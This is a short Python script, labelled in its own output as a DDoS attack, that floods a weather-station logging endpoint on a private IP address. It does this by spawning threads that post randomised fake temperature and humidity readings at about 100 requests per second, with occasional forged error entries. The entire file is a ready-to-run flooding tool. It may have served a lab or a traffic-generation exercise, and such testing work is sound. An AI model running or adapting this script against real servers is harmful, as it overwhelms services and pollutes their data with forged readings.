import requests
import threading
import time
import random

server_url = 'http://10.34.221.112:5000/log'  # Weather station server endpoint

def send_ddos_weather():
    temp = round(random.uniform(20, 32), 1)
    humid = round(random.uniform(40, 95), 1)
    
    # 1% chance of sending an error
    is_error = random.choices([False, True], weights=[99, 1])[0]
    
    if is_error:
        status = "error"
        error_message = "malicious activity"
    else:
        status = "OK"
        error_message = "-"
    
    attack_data = {
        "device_id": "weather_station_1",
        "temperature": temp,
        "humidity": humid,
        "status": status,
        "error_message": error_message
    }

    try:
        response = requests.post(server_url, json=attack_data, timeout=2)
        print(response.status_code, response.text, attack_data)
    except Exception as e:
        print("Error:", e)

threads = []

try:
    print("DDoS attack running. Press Ctrl+C to stop.")
    while True:
        t = threading.Thread(target=send_ddos_weather)
        t.start()
        threads.append(t)
        time.sleep(0.01)  # 100 requests/sec
except KeyboardInterrupt:
    print("\nAttack interrupted by user. Waiting for all threads to complete...")
    for t in threads:
        t.join()
    print("Attack stopped.")
